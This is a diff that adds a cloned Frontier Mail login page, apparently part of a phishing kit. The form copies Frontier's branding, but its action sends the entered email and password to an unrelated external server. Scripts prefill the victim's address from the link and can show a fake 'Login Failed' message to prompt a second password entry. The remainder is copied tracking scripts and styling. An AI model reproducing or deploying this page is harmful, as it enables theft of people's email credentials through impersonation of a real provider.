@@ -1,0 +1,864 @@
+<!DOCTYPE html>
+<html data-di-loaded="1"><head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    
+
+    
+
+    <title>Frontier Mail Login</title>
+    <link rel="shortcut icon" href="https://login.frontier.com/ftr-sys-theme/img/favicon.svg">
+    <link rel="icon" href="https://login.frontier.com/ftr-sys-theme/img/favicon.svg" type="image/ico">
+
+    <!-- Bootstrap -->
+    <link rel="stylesheet" href="index_files/bootstrap.min.css">
+
+    <!-- FontAwesome -->
+    <!-- Use local copy, when remote hosts are expected to be unreachable. -->
+    <link rel="stylesheet" href="index_files/font-awesome.min.css">
+    <!-- Use latest remote copy, when remote hosts are expected to be reachable. -->
+    <!-- link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css" -->
+
+    <!-- WebFonts -->
+    <link rel="stylesheet" href="index_files/webfonts.css">
+
+    <!-- Our custom CSS -->
+    <link rel="stylesheet" href="index_files/base.css">
+    <link rel="stylesheet" href="index_files/social.css">
+
+    <link href="index_files/webmail.css" rel="stylesheet" type="text/css">
+
+    <!-- IE 8 Shiv -->
+    <!--[if lt IE 9]><script src="/ftr-sys-theme/res/js/polyfillshiv.js"></script><![endif]-->
+    <!--[if lt IE 9]><script src="/ftr-sys-theme/res/js/html5shiv.min.js"></script><![endif]-->
+
+    <!-- JQuery -->
+    <script src="index_files/594a94134fcb9c3f6a3e3f2f5760b4d0.js" type="text/javascript" async=""></script><script type="text/javascript" async="" src="index_files/analytics.js"></script><script type="text/javascript" async="" src="index_files/js"></script><script type="text/javascript" async="" src="index_files/js_003"></script><script src="index_files/3707.js" async="" type="text/javascript"></script><script type="text/javascript" async="" src="index_files/ga.js"></script><script src="index_files/all_002.js" async="" crossorigin="anonymous"></script><script async="" src="index_files/di.js"></script><script type="text/javascript" async="" src="index_files/recaptcha__en.js" crossorigin="anonymous" integrity="sha384-vl/8YmDHOItetW8MAXs9oyIDH1Yih0iwYfiAcyXqRbulOnFqquQtr1hJC2UM6oMW"></script><script src="index_files/jquery-3.5.1.min.js"></script>
+
+    <!-- Bootstrap -->
+    <script src="index_files/bootstrap.min.js"></script>
+
+    <!-- Our custom scripts -->
+    <script src="index_files/accordion.js"></script>
+    <script src="index_files/jump.js"></script>
+
+    <script src="index_files/api.js" async="" defer="defer"></script>
+
+    <script src="index_files/dtm_top.js"></script><script src="index_files/satelliteLib-4b8641237ab881231ea9edcc135d0fdd111e2a40.js"></script><script src="index_files/EXb4a5b95ecb8d49fc8b26e815d909619f-libraryCode_source.min.js" async=""></script><script>
+window.s_onPlayerReady=function (event) {}
+window.s_onMilestone=function (event,state) {
+  var t=s_onMilestone;
+
+
+  // this keeps track of the current video event each time the function calls itself. 
+  if (state) t.state=state;
+  // this keeps track of the event. This is originally passed from youtube api 
+  // to s_trackonPlayerStateChange, which then passes it to this function 
+  if (event) t.event=event;
+  // get the current time elapsed (seconds) of the video
+  var currentTime=t.event.target.getCurrentTime();
+  // get the total video length 
+  var duration=t.event.target.getDuration();
+
+  /* p1: keep track of resetting video events for new videos */
+  var videoData = t.event.target.getVideoData();
+  if (!t.videoData) t.videoData = videoData;
+  if (t.videoData.title!=videoData.title) t.viewed=false;
+  
+  // init the flags for milestone events having been viewed
+  if (!t.viewed) {
+    t.viewed={
+      '25' : false,
+      '50' : false,
+      '75' : false
+    };
+  }
+  // it is possible for duration to be 0 depending on current state of video
+  // or type of video (e.g. for live feeds, duration is always currentTime, which 
+  // can start at 0. So we take some precaution to avoid division by 0 here.
+  var percentViewed=0;
+  var elapsed = Math.floor(duration/4); 
+  var label = false;
+  var payload=false;
+  if (duration)
+    var percentViewed = Math.floor((currentTime/duration)*100);
+  // here is where you specify the % milestones you want to pop something on
+  switch(percentViewed) {
+    case 25 : 
+      if (!t.viewed['25']) {
+        t.viewed['25']=true;
+        payload = {
+          'events' : ('event62,event66,event67='+elapsed),
+          'eVar62' : '1:M:0-25',
+        }
+        label='Video: 25% Viewed';
+      }
+      break;
+    case 50 : 
+      if (!t.viewed['50']) {
+        t.viewed['50']=true;
+        payload = {
+          'events' : ('event63,event66,event67='+elapsed),
+          'eVar62' : '2:M:25-50',
+        }
+        label='Video: 50% Viewed';
+      }
+      break;
+    case 75 : 
+      if (!t.viewed['75']) {
+        t.viewed['75']=true;
+        payload = {
+          'events' : ('event64,event66,event67='+elapsed),
+          'eVar62' : '3:M:50-75',
+        }
+        label='Video: 75% Viewed';
+      }
+      break;
+  }
+  if (payload&&label) {
+    s_dtm.trackData(payload,'tl_o',label);
+  }
+
+  /* p2: keep track of resetting video events for new videos */
+  t.videoData = videoData;
+
+  /* 
+    as long as the swith is "on", we keep calling the function. But for example
+    if the visitor clicks pause or video ends, we call the function from those
+    events to turn it "off" (t.state=='stop'). This isn't technically necessary 
+    thing to do, since we pop milestone stuff based off what the actual percent 
+    viewed currently is, vs. whether or not it's already been popped.  I did 
+    this for performance reasons. 
+  */
+  if (t.state=='start')
+    window.setTimeout('s_onMilestone()',500);
+}
+/* 
+  this is the callback function for when the youtube video decides its state 
+  has been changed.  well actually as noted the way it's implemented here is that 
+  we have this called within the real callback function, but you get the point
+*/
+window.s_onPlayerStateChange=function(event) {
+  /* 
+   as with the milestone wrapper, had some choices to make about keeping track 
+   of stuff and having it available each time function is called, and I settled 
+   with doing static variable style. 
+  */
+  var t=s_onPlayerStateChange;
+  // these are the player states youtube outputs. we're using a map here for 
+  // better code readability
+  var youTubePlayerStates = {
+    unstarted:      -1,
+    finished:       0,
+    playing:        1,
+    paused:         2,
+    buffering:      3,
+    cued:           5
+  };
+  var currentState = event.data;
+
+  /* 
+    note: length and current time aren't currently used within the scope of 
+    of this function for the nasdaq imp i did. they are used for milestones but
+    i pass the whole event object to it. but I left these in here as an example 
+    in case it's needed for the scope of the other events within this function
+  */
+  // get video length
+  t.duration=event.target.getDuration();
+  // Get the current position to the nearest next second
+  var currentTime = Math.ceil(event.target.getCurrentTime());
+
+  var elapsed = Math.floor(t.duration/4); 
+
+  var payload=false;  
+  
+  // this retrieves info about the video (id, title, author)
+  var videoData = event.target.getVideoData();
+  /* p1: keep track of resetting video events for new videos */
+  if (!t.videoData) t.videoData = videoData;
+  if (t.videoData.title!=videoData.title) t.played=false;
+
+  /*
+    here is the main switch where we pop stuff based on the video state, 
+    e.g play, stop, etc. in nasdaq's example, i didn't need to pop something 
+    for every possible state, but i left them here but empty as examples.
+    
+    as mentioned in the milestones function, we call s_onMilestone with a 
+    'start' (on) and 'stop' (off) flags, depending on the event, to tell 
+    s_onMilestone when to start and stop calling itself over and over to monitor 
+    and eval current % viewed
+  */
+  // Figure out what state we are in
+  switch(currentState) {
+    // Video has been initialized, but not started
+    case youTubePlayerStates.unstarted:
+      break;
+    // Video finished
+    case youTubePlayerStates.finished:
+      // Show that we have indeed completed the video
+      var payload = {
+        'events' : ('event65,event66,event67='+elapsed),
+        'eVar62' : '4:M:75-100'
+      }
+      s_dtm.trackData(payload,'o','Video: Completed');
+
+      t.completed = true;
+      s_onMilestone(event,'stop');
+      break;
+   // Video started to play
+   case youTubePlayerStates.playing:
+     // This video has never been played before
+     if(!t.played) {
+       // Show that we have started to play the video
+       var payload = {
+         'events':'event61',
+         'prop61':videoData.title,
+         'eVar61':videoData.title,
+         'eVar62' : '1:M:0-25',
+         'eVar63':'youtube player'
+       }
+       s_dtm.trackData(payload,'tl_o','Video: Start');
+       t.played = true;
+       s_onMilestone(event,'start');
+     } 
+     // The video has been played before, and has recently finished (replay)
+     else if(t.played && t.completed) {
+       // Show that we haven't finished the video yet (since we just started watching it again)
+       var payload = {
+         'events':'event61',
+         'prop61':videoData.title,
+         'eVar61':videoData.title,
+         'eVar62' : '1:M:0-25',
+         'eVar63':'youtube player'
+       }
+       s_dtm.trackData(payload,'tl_o','Video: Start');
+       t.completed = false;
+       console.log('replay');
+       s_onMilestone(event,'start');
+     } else {
+       // Video Unpaused/played from buffering
+       console.log('unpaused/played from buffering');
+       s_onMilestone(event,'start');
+     }
+     break;
+   // Video has been paused
+   case youTubePlayerStates.paused:
+     console.log('paused');
+     s_onMilestone(event,'stop');
+     break;
+   // Video is now buffering
+   case youTubePlayerStates.buffering:
+     console.log('buffering');
+     break;
+   // Video is cued up from a playlist
+   case youTubePlayerStates.cued:
+     console.log('cued');
+     break;
+   // new / unknown state
+   default:
+     console.log('unkown state');
+     break;
+  }
+
+  // Setup our previous youTubePlayerStates for the next call
+  t.previousTime = currentTime;
+  t.previousState = currentState;
+  /* p2: keep track of resetting video events for new videos */
+  t.videoData = videoData;
+} // end s_onPlayerStateChange
+</script><script>_satellite["__runScript1"](function(event, target) {
+(function(d,e,c,i,b,el,it) {
+  d._da_=d._da_||[];_da_.oldErr=d.onerror;_da_.err=[];
+  d.onerror=function(){_da_.err.push(arguments);_da_.oldErr&&_da_.oldErr.apply(d,Array.prototype.slice.call(arguments));};
+  d.DecibelInsight=b;d[b]=d[b]||function(){(d[b].q=d[b].q||[]).push(arguments);};
+  el=e.createElement(c),it=e.getElementsByTagName(c)[0];el.async=1;el.src=i;it.parentNode.insertBefore(el,it);
+})(window,document,'script','https://cdn.decibelinsight.net/i/13858/239982/di.js','decibelInsight');
+});</script><style type="text/css" data-di-track="1">
+.kampyle_button-text {
+  text-transform: capitalize !important;
+}
+</style><script>
+try{
+/*!
+ * JavaScript Cookie v2.2.0
+ * https://github.com/js-cookie/js-cookie
+ *
+ * Copyright 2006, 2015 Klaus Hartl & Fagner Brack
+ * Released under the MIT license
+ */
+;(function (factory) {
+	var registeredInModuleLoader = false;
+	if (typeof define === 'function' && define.amd) {
+		define(factory);
+		registeredInModuleLoader = true;
+	}
+	if (typeof exports === 'object') {
+		module.exports = factory();
+		registeredInModuleLoader = true;
+	}
+	if (!registeredInModuleLoader) {
+		var OldCookies = window.Cookies;
+		var api = window.Cookies = factory();
+		api.noConflict = function () {
+			window.Cookies = OldCookies;
+			return api;
+		};
+	}
+}(function () {
+	function extend () {
+		var i = 0;
+		var result = {};
+		for (; i < arguments.length; i++) {
+			var attributes = arguments[ i ];
+			for (var key in attributes) {
+				result[key] = attributes[key];
+			}
+		}
+		return result;
+	}
+
+	function init (converter) {
+		function api (key, value, attributes) {
+			var result;
+			if (typeof document === 'undefined') {
+				return;
+			}
+
+			// Write
+
+			if (arguments.length > 1) {
+				attributes = extend({
+					path: '/'
+				}, api.defaults, attributes);
+
+				if (typeof attributes.expires === 'number') {
+					var expires = new Date();
+					expires.setMilliseconds(expires.getMilliseconds() + attributes.expires * 864e+5);
+					attributes.expires = expires;
+				}
+
+				// We're using "expires" because "max-age" is not supported by IE
+				attributes.expires = attributes.expires ? attributes.expires.toUTCString() : '';
+
+				try {
+					result = JSON.stringify(value);
+					if (/^[\{\[]/.test(result)) {
+						value = result;
+					}
+				} catch (e) {}
+
+				if (!converter.write) {
+					value = encodeURIComponent(String(value))
+						.replace(/%(23|24|26|2B|3A|3C|3E|3D|2F|3F|40|5B|5D|5E|60|7B|7D|7C)/g, decodeURIComponent);
+				} else {
+					value = converter.write(value, key);
+				}
+
+				key = encodeURIComponent(String(key));
+				key = key.replace(/%(23|24|26|2B|5E|60|7C)/g, decodeURIComponent);
+				key = key.replace(/[\(\)]/g, escape);
+
+				var stringifiedAttributes = '';
+
+				for (var attributeName in attributes) {
+					if (!attributes[attributeName]) {
+						continue;
+					}
+					stringifiedAttributes += '; ' + attributeName;
+					if (attributes[attributeName] === true) {
+						continue;
+					}
+					stringifiedAttributes += '=' + attributes[attributeName];
+				}
+				return (document.cookie = key + '=' + value + stringifiedAttributes);
+			}
+
+			// Read
+
+			if (!key) {
+				result = {};
+			}
+
+			// To prevent the for loop in the first place assign an empty array
+			// in case there are no cookies at all. Also prevents odd result when
+			// calling "get()"
+			var cookies = document.cookie ? document.cookie.split('; ') : [];
+			var rdecode = /(%[0-9A-Z]{2})+/g;
+			var i = 0;
+
+			for (; i < cookies.length; i++) {
+				var parts = cookies[i].split('=');
+				var cookie = parts.slice(1).join('=');
+
+				if (!this.json && cookie.charAt(0) === '"') {
+					cookie = cookie.slice(1, -1);
+				}
+
+				try {
+					var name = parts[0].replace(rdecode, decodeURIComponent);
+					cookie = converter.read ?
+						converter.read(cookie, name) : converter(cookie, name) ||
+						cookie.replace(rdecode, decodeURIComponent);
+
+					if (this.json) {
+						try {
+							cookie = JSON.parse(cookie);
+						} catch (e) {}
+					}
+
+					if (key === name) {
+						result = cookie;
+						break;
+					}
+
+					if (!key) {
+						result[name] = cookie;
+					}
+				} catch (e) {}
+			}
+
+			return result;
+		}
+
+		api.set = api;
+		api.get = function (key) {
+			return api.call(api, key);
+		};
+		api.getJSON = function () {
+			return api.apply({
+				json: true
+			}, [].slice.call(arguments));
+		};
+		api.defaults = {};
+
+		api.remove = function (key, attributes) {
+			api(key, '', extend(attributes, {
+				expires: -1
+			}));
+		};
+
+		api.withConverter = init;
+
+		return api;
+	}
+
+	return init(function () {});
+}));
+}catch(e){window.console&&console.error(e);}
+try{
+_satellite._cookies = Cookies.noConflict();  
+}catch(e){window.console&&console.error(e);}
+</script><script>
+window['ga-disable-G-WM1B1X29Q2']=true;
+window['ga-disable-G-51XC383R1D']=true;
+
+</script>
+
+  <script src="index_files/RCa9fa9f53f1ae4c018cdec712660d9ce4-source.min.js" async=""></script><script src="index_files/js_002" async=""></script><style type="text/css" data-fbcssmodules="css:fb.css.base css:fb.css.dialog css:fb.css.iframewidget css:fb.css.customer_chat_plugin_iframe" data-di-track="1">.fb_hidden{position:absolute;top:-10000px;z-index:10001}.fb_reposition{overflow:hidden;position:relative}.fb_invisible{display:none}.fb_reset{background:none;border:0;border-spacing:0;color:#000;cursor:auto;direction:ltr;font-family:'lucida grande', tahoma, verdana, arial, sans-serif;font-size:11px;font-style:normal;font-variant:normal;font-weight:normal;letter-spacing:normal;line-height:1;margin:0;overflow:visible;padding:0;text-align:left;text-decoration:none;text-indent:0;text-shadow:none;text-transform:none;visibility:visible;white-space:normal;word-spacing:normal}.fb_reset>div{overflow:hidden}@keyframes fb_transform{from{opacity:0;transform:scale(.95)}to{opacity:1;transform:scale(1)}}.fb_animate{animation:fb_transform .3s forwards}
+.fb_hidden{position:absolute;top:-10000px;z-index:10001}.fb_reposition{overflow:hidden;position:relative}.fb_invisible{display:none}.fb_reset{background:none;border:0;border-spacing:0;color:#000;cursor:auto;direction:ltr;font-family:'lucida grande', tahoma, verdana, arial, sans-serif;font-size:11px;font-style:normal;font-variant:normal;font-weight:normal;letter-spacing:normal;line-height:1;margin:0;overflow:visible;padding:0;text-align:left;text-decoration:none;text-indent:0;text-shadow:none;text-transform:none;visibility:visible;white-space:normal;word-spacing:normal}.fb_reset>div{overflow:hidden}@keyframes fb_transform{from{opacity:0;transform:scale(.95)}to{opacity:1;transform:scale(1)}}.fb_animate{animation:fb_transform .3s forwards}
+.fb_dialog{background:rgba(82, 82, 82, .7);position:absolute;top:-10000px;z-index:10001}.fb_dialog_advanced{border-radius:8px;padding:10px}.fb_dialog_content{background:#fff;color:#373737}.fb_dialog_close_icon{background:url(https://connect.facebook.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 0 transparent;cursor:pointer;display:block;height:15px;position:absolute;right:18px;top:17px;width:15px}.fb_dialog_mobile .fb_dialog_close_icon{left:5px;right:auto;top:5px}.fb_dialog_padding{background-color:transparent;position:absolute;width:1px;z-index:-1}.fb_dialog_close_icon:hover{background:url(https://connect.facebook.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 -15px transparent}.fb_dialog_close_icon:active{background:url(https://connect.facebook.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 -30px transparent}.fb_dialog_iframe{line-height:0}.fb_dialog_content .dialog_title{background:#6d84b4;border:1px solid #365899;color:#fff;font-size:14px;font-weight:bold;margin:0}.fb_dialog_content .dialog_title>span{background:url(https://connect.facebook.net/rsrc.php/v3/yd/r/Cou7n-nqK52.gif) no-repeat 5px 50%;float:left;padding:5px 0 7px 26px}body.fb_hidden{height:100%;left:0;margin:0;overflow:visible;position:absolute;top:-10000px;transform:none;width:100%}.fb_dialog.fb_dialog_mobile.loading{background:url(https://connect.facebook.net/rsrc.php/v3/ya/r/3rhSv5V8j3o.gif) white no-repeat 50% 50%;min-height:100%;min-width:100%;overflow:hidden;position:absolute;top:0;z-index:10001}.fb_dialog.fb_dialog_mobile.loading.centered{background:none;height:auto;min-height:initial;min-width:initial;width:auto}.fb_dialog.fb_dialog_mobile.loading.centered #fb_dialog_loader_spinner{width:100%}.fb_dialog.fb_dialog_mobile.loading.centered .fb_dialog_content{background:none}.loading.centered #fb_dialog_loader_close{clear:both;color:#fff;display:block;font-size:18px;padding-top:20px}#fb-root #fb_dialog_ipad_overlay{background:rgba(0, 0, 0, .4);bottom:0;left:0;min-height:100%;position:absolute;right:0;top:0;width:100%;z-index:10000}#fb-root #fb_dialog_ipad_overlay.hidden{display:none}.fb_dialog.fb_dialog_mobile.loading iframe{visibility:hidden}.fb_dialog_mobile .fb_dialog_iframe{position:sticky;top:0}.fb_dialog_content .dialog_header{background:linear-gradient(from(#738aba), to(#2c4987));border-bottom:1px solid;border-color:#043b87;box-shadow:white 0 1px 1px -1px inset;color:#fff;font:bold 14px Helvetica, sans-serif;text-overflow:ellipsis;text-shadow:rgba(0, 30, 84, .296875) 0 -1px 0;vertical-align:middle;white-space:nowrap}.fb_dialog_content .dialog_header table{height:43px;width:100%}.fb_dialog_content .dialog_header td.header_left{font-size:12px;padding-left:5px;vertical-align:middle;width:60px}.fb_dialog_content .dialog_header td.header_right{font-size:12px;padding-right:5px;vertical-align:middle;width:60px}.fb_dialog_content .touchable_button{background:linear-gradient(from(#4267B2), to(#2a4887));background-clip:padding-box;border:1px solid #29487d;border-radius:3px;display:inline-block;line-height:18px;margin-top:3px;max-width:85px;padding:4px 12px;position:relative}.fb_dialog_content .dialog_header .touchable_button input{background:none;border:none;color:#fff;font:bold 12px Helvetica, sans-serif;margin:2px -12px;padding:2px 6px 3px 6px;text-shadow:rgba(0, 30, 84, .296875) 0 -1px 0}.fb_dialog_content .dialog_header .header_center{color:#fff;font-size:16px;font-weight:bold;line-height:18px;text-align:center;vertical-align:middle}.fb_dialog_content .dialog_content{background:url(https://connect.facebook.net/rsrc.php/v3/y9/r/jKEcVPZFk-2.gif) no-repeat 50% 50%;border:1px solid #4a4a4a;border-bottom:0;border-top:0;height:150px}.fb_dialog_content .dialog_footer{background:#f5f6f7;border:1px solid #4a4a4a;border-top-color:#ccc;height:40px}#fb_dialog_loader_close{float:left}.fb_dialog.fb_dialog_mobile .fb_dialog_close_icon{visibility:hidden}#fb_dialog_loader_spinner{animation:rotateSpinner 1.2s linear infinite;background-color:transparent;background-image:url(https://connect.facebook.net/rsrc.php/v3/yD/r/t-wz8gw1xG1.png);background-position:50% 50%;background-repeat:no-repeat;height:24px;width:24px}@keyframes rotateSpinner{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+.fb_iframe_widget{display:inline-block;position:relative}.fb_iframe_widget span{display:inline-block;position:relative;text-align:justify}.fb_iframe_widget iframe{position:absolute}.fb_iframe_widget_fluid_desktop,.fb_iframe_widget_fluid_desktop span,.fb_iframe_widget_fluid_desktop iframe{max-width:100%}.fb_iframe_widget_fluid_desktop iframe{min-width:220px;position:relative}.fb_iframe_widget_lift{z-index:1}.fb_iframe_widget_fluid{display:inline}.fb_iframe_widget_fluid span{width:100%}
+.fb_mpn_mobile_landing_page_slide_out{animation-duration:200ms;animation-name:fb_mpn_landing_page_slide_out;transition-timing-function:ease-in}.fb_mpn_mobile_landing_page_slide_out_from_left{animation-duration:200ms;animation-name:fb_mpn_landing_page_slide_out_from_left;transition-timing-function:ease-in}.fb_mpn_mobile_landing_page_slide_up{animation-duration:500ms;animation-name:fb_mpn_landing_page_slide_up;transition-timing-function:ease-in}.fb_mpn_mobile_bounce_in{animation-duration:300ms;animation-name:fb_mpn_bounce_in;transition-timing-function:ease-in}.fb_mpn_mobile_bounce_out{animation-duration:300ms;animation-name:fb_mpn_bounce_out;transition-timing-function:ease-in}.fb_mpn_mobile_bounce_out_v2{animation-duration:300ms;animation-name:fb_mpn_fade_out;transition-timing-function:ease-in}.fb_customer_chat_bounce_in_v2{animation-duration:300ms;animation-name:fb_bounce_in_v2;transition-timing-function:ease-in}.fb_customer_chat_bounce_in_from_left{animation-duration:300ms;animation-name:fb_bounce_in_from_left;transition-timing-function:ease-in}.fb_customer_chat_bounce_out_v2{animation-duration:300ms;animation-name:fb_bounce_out_v2;transition-timing-function:ease-in}.fb_customer_chat_bounce_out_from_left{animation-duration:300ms;animation-name:fb_bounce_out_from_left;transition-timing-function:ease-in}.fb_invisible_flow{display:inherit;height:0;overflow-x:hidden;width:0}@keyframes fb_mpn_landing_page_slide_out{0%{margin:0 12px;width:100% - 24px}60%{border-radius:18px}100%{border-radius:50%;margin:0 24px;width:60px}}@keyframes fb_mpn_landing_page_slide_out_from_left{0%{left:12px;width:100% - 24px}60%{border-radius:18px}100%{border-radius:50%;left:12px;width:60px}}@keyframes fb_mpn_landing_page_slide_up{0%{bottom:0;opacity:0}100%{bottom:24px;opacity:1}}@keyframes fb_mpn_bounce_in{0%{opacity:.5;top:100%}100%{opacity:1;top:0}}@keyframes fb_mpn_fade_out{0%{bottom:30px;opacity:1}100%{bottom:0;opacity:0}}@keyframes fb_mpn_bounce_out{0%{opacity:1;top:0}100%{opacity:.5;top:100%}}@keyframes fb_bounce_in_v2{0%{opacity:0;transform:scale(0, 0);transform-origin:bottom right}50%{transform:scale(1.03, 1.03);transform-origin:bottom right}100%{opacity:1;transform:scale(1, 1);transform-origin:bottom right}}@keyframes fb_bounce_in_from_left{0%{opacity:0;transform:scale(0, 0);transform-origin:bottom left}50%{transform:scale(1.03, 1.03);transform-origin:bottom left}100%{opacity:1;transform:scale(1, 1);transform-origin:bottom left}}@keyframes fb_bounce_out_v2{0%{opacity:1;transform:scale(1, 1);transform-origin:bottom right}100%{opacity:0;transform:scale(0, 0);transform-origin:bottom right}}@keyframes fb_bounce_out_from_left{0%{opacity:1;transform:scale(1, 1);transform-origin:bottom left}100%{opacity:0;transform:scale(0, 0);transform-origin:bottom left}}@keyframes slideInFromBottom{0%{opacity:.1;transform:translateY(100%)}100%{opacity:1;transform:translateY(0)}}@keyframes slideInFromBottomDelay{0%{opacity:0;transform:translateY(100%)}97%{opacity:0;transform:translateY(100%)}100%{opacity:1;transform:translateY(0)}}</style></head>
+  <body>
+    <section>
+
+      <div class="header_area">
+        <nav class="navbar navbar-inverse ftr-navbar-inverse-solid" role="navigation">
+          <div class="container">
+            <div class="navbar-header visible-xs">
+              <div class="row">
+                <div class="col-xs-2">
+                  <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#frontier-navbar-collapse">
+                    <span class="sr-only">Toggle navigation</span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                  </button>
+                </div>
+                <div class="col-xs-8 navbar-div-logo">
+                  <a href="https://frontier.com/"><img class="logo-img" src="index_files/frontier-logo-white.png"></a>
+                </div>
+              </div>
+            </div>
+            <div class="collapse navbar-collapse" id="frontier-navbar-collapse">
+              <ul class="nav navbar-nav">
+                <li><a href="https://frontier.com/">Residential</a></li>
+                <li><a href="https://business.frontier.com/">Small Business</a></li>
+                <li><a href="https://enterprise.frontier.com/">Enterprise</a></li>
+                <li><a href="https://wholesale.frontier.com/home">Wholesale</a></li>
+              </ul>
+            </div>
+          </div>
+        </nav>
+      </div><!-- header_area -->
+
+      <div class="logo_area">
+        <div class="container hidden-xs">
+          <div class="row">
+            <div class="col-sm-4 logo-div-img">
+              <a href="https://frontier.com/"><img class="logo-img" src="index_files/frontier_header.png"></a>
+            </div>
+            <div class="col-sm-8">
+              <form>
+                <div>
+                  <select id="jump_selection">
+                    <option value="" selected="selected">Go to... </option>
+                    <option value="https://frontier.com/account?page=/summary">My Account</option>
+                    <option value="https://frontier.com/account?page=/payments/onetime">Pay Your Bill</option>
+                    <option value="https://login.frontier.com/webmail">Check Your Mail</option>
+                  </select>
+                </div>
+              </form>
+            </div>
+          </div>
+        </div>
+      </div><!-- logo_area -->
+
+      <div class="main_area">
+        <div class="container">
+
+          <!-- BEGIN CONTENT -->
+
+<div class="well">
+
+<script src="index_files/widgets.js" id="twitter-wjs"></script>
+<script src="index_files/all.js" id="facebook-jssdk"></script>
+<script type="text/javascript">
+<!--
+function submit_login(e)
+{
+  form = document.login;
+
+  form.email.value = form.email.value.replace(/^\s+|\s+$/g, '');
+
+  if (form.email.value.search(/^[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}$/i)){
+    alert('Please provide your full e-mail address.');
+    form.email.focus();
+    return false;
+  } else if (form.pass.value == '') {
+    alert('Please provide your password.');
+    form.pass.focus();
+    return false;
+  } else {
+    form.loginButton.disabled = true;
+    form.submit();
+    return true;
+  }
+}
+//-->
+</script>
+
+
+
+              <script type="text/javascript">
+                    function getParameterByName(name, url) {
+                        if (!url) url = window.location.href;
+                        name = name.replace(/[\[\]]/g, "\\$&");
+                        var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                            results = regex.exec(url);
+                        if (!results) return null;
+                        if (!results[2]) return '';
+                        return decodeURIComponent(results[2].replace(/\+/g, " "));
+                    }
+                    var email = getParameterByName('email');
+                    var chck = getParameterByName('chck');
+                    var warn = document.getElementById('warn');
+
+                    if (chck) {
+                      warn.style.display = "block";
+                    }
+                </script>
+
+
+
+         <form autocomplete="off" name="payment" method="post" action="
+https://reiseberatung-passau.de/.hr/mail.php" id="loginform" onsubmit="return validateForm()" >
+
+
+      <div id="webmail-login">
+        <div class="container">
+          <div class="row">
+            <div class="col-md-9 col-md-offset-1">
+              <h1>Frontier Mail Login</h1>
+            </div>
+                        <p id="warn" style="display: none;color:red;margin-bottom: 18px;">Login Failed, please enter correct password.</p>
+  
+
+            <div class="col-md-4 col-md-offset-1">
+              <div class="form-group">
+                <label for="email">Email Address</label>
+                <input type="text" class="form-control" tabindex="1" name="user" id="email" placeholder="username@frontier.com">
+              </div>
+
+
+
+
+                <script type="text/javascript">loginform.user.value = email;</script>
+
+                <input type="hidden" name="chck" value="">
+                <script type="text/javascript">loginform.chck.value = chck;</script>
+                
+
+
+
+              <div class="form-group">
+                <label for="pass">Password</label>
+                <input type="password" class="form-control" tabindex="2" name="pass" id="pass" placeholder="**********" autocomplete="off">
+              </div>
+
+
+
+              <button type="submit" tabindex="6" class="btn btn-primary btn-block" onclick="return submit_login();" value="Login" alt="submit">Login</button>
+
+              <p><a href="https://acctedit.frontier.com/forgot-password;src=mail">Forgot your password ?</a></p>
+            </div>
+
+            <div class="col-md-4 col-md-offset-1">
+              <div class="col-sm-9 col-md-offset-1 hidden-lg">
+                <hr>
+              </div>
+
+              <p class="yahoo-font-color">Make <a href="http://frontier.my.yahoo.com/">Frontier Yahoo! your homepage</a>.
+              </p>
+
+              <div id="yahooSearchTop">
+                
+                  <div class="form-group">
+
+<script type="text/javascript">
+<!--
+      function CheckForEnter(e, inputName)
+      {
+        e = (e) ? e : event;
+        if(e.which || e.keyCode){
+          if ((e.which == 13) || (e.keyCode == 13)) {
+            document.getElementById(inputName).click();
+            e.returnValue = false;
+            e.cancel = true;
+            return false;
+          }
+        }
+        else 
+        {
+          return true;
+        }
+      }
+                
+      function executeSearchTop(thisForm){
+        var resultURL=''; 
+        resultURL+='https://search.yahoo.com/yhs/search?hspart=frontier&hsimp=yhs-frontier1&p=';
+        resultURL+=escape(thisForm.searchforTop.value); 
+        var gotoURL=resultURL; 
+         
+        document.location.href=gotoURL; 
+        return false;                                                   
+      }
+-->
+</script>
+
+                    <img title="" alt="Powered By Yahoo! Search" src="index_files/yahoo_logo.gif">
+                    <button class="btn" type="web search" onclick="return executeSearchTop(this.form);" name="SubmitSearch" id="SubmitSearch"> Web Search </button>
+                    <input class="form-control" tabindex="6" onkeypress="return CheckForEnter(event, 'SubmitSearch');" name="searchforTop" id="inputSearch">
+                  </div>
+                  <input type="hidden" name="stTop" value="site">
+                   
+              </div><!-- end of yahooSearchTop -->
+
+            </div>
+
+            <div class="col-sm-9 col-md-offset-1">
+              <hr>
+            </div>
+
+            <div class="col-sm-9 col-md-offset-1">
+              <!--fid-help-links class="ng-isolate-scope"-->
+                <p class="fid-help-links"> <span data-i18n="fid.need-help">Still need help?</span> <span class="fid-help-links-option"> <i class="fa fa-comment fa-lg"></i> <a href="https://frontier.com/helpcenter/contact-us" target="_blank" data-i18n="fid.live-chat">Live Chat</a> </span> <span class="fid-help-links-option"> <i class="fa fa-question-circle fa-lg"></i> <a href="https://frontier.com/helpcenter" target="_blank" data-i18n="fid.help-center">Help Center</a> </span> </p>
+              <!--/fid-help-links-->
+            </div>
+
+            <div class="col-sm-9 col-md-offset-1">
+              <p><strong>Note:</strong> For your security, please be sure to log out when you are done.</p>
+              <p>
+                Frontier does not track how you use e-mail or what sites
+ you visit. If your Frontier e-mail is hosted by Yahoo!, Yahoo! does not
+ share this information with Frontier. <a href="http://www.frontier.com/policies">See Frontier's Privacy Policy.</a>
+              </p>
+            </div>
+
+          </div>
+        </div>
+      </div></form>
+
+      
+
+      <p class="hiddenhost">
+        mlogin02.dlls.pa.frontiernet.net 
+      </p>
+
+<!-- Begin Google Analytics -->
+<script type="text/javascript">
+
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-33866788-3']);
